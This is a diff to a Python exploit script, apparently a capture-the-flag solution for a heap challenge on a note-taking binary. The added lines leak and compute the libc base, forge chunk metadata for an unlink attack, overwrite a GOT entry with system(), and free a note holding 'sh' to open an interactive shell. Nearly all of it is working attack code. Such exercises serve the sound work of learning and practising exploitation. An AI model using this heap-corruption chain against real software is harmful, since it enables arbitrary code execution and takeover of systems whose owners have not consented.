@@ -21,6 +21,12 @@ def delete_note(n):
     r.send('4\n')
     r.sendafter('Note number:', str(n)+'\n')
 
+def edit_note(num,len,data):
+    r.send('3\n')
+    r.send(str(num)+'\n')
+    r.send(str(len)+'\n')
+    r.send(data)
+
 #
 # 1 free() -> fd & bk pointer points <main_arena>
 #
@@ -106,6 +112,7 @@ if __name__ == "__main__":
     new_note('C'*8) # overwrite fd pointer and still we have bk pointer to <main_arena>
     
     leaked_libc = leak_libc() 
+    libc_base = leaked_libc - (0x7f8f01ab8b78 - 0x7f8f016f4000)
 
     raw_input('after leaking libc...')
 
@@ -148,11 +155,13 @@ if __name__ == "__main__":
 
     new_note('A'*0x80)
     new_note('B'*0x80)
+    new_note('B'*0x80)
     
     raw_input('after alloc two chunks...')
 
     delete_note(0)
     delete_note(1)
+    delete_note(2)
 
     raw_input('after free two chunks...')
 
@@ -183,7 +192,11 @@ if __name__ == "__main__":
 
     chunk_0 = p64(0) + p64(8) + p64(target-24) + p64(target-16) + 'A'*(0x80-32)
     chunk_1 = p64(0x80) + p64(0x90) + 'B'*0x80
-    new_note(chunk_0 + chunk_1)
+    chunk_2 = p64(0) + p64(0x91) + 'C'*0x80
+
+    payload_len = len(chunk_0 + chunk_1 + chunk_2)
+
+    new_note(chunk_0 + chunk_1 + chunk_2)
 
     raw_input('after overwriting metadata...')
 
@@ -202,3 +215,19 @@ if __name__ == "__main__":
     delete_note(1)
 
     raw_input('after deleting note_1...')
+
+    edit_note(0,payload_len, p64(1) + p64(1) + p64(8) + p64(0x602018) + 'x'*(payload_len-32))
+
+    raw_input('after editing note_0->ptr to 0x602018...')
+
+    edit_note(0,8, p64(libc_base+libc.symbols['system']))
+
+    raw_input('after editing note_0->ptr to system()...')
+
+    new_note('sh\x00')
+
+    raw_input('after new note /bin/sh...')
+    
+    delete_note(17)
+
+    r.interactive()
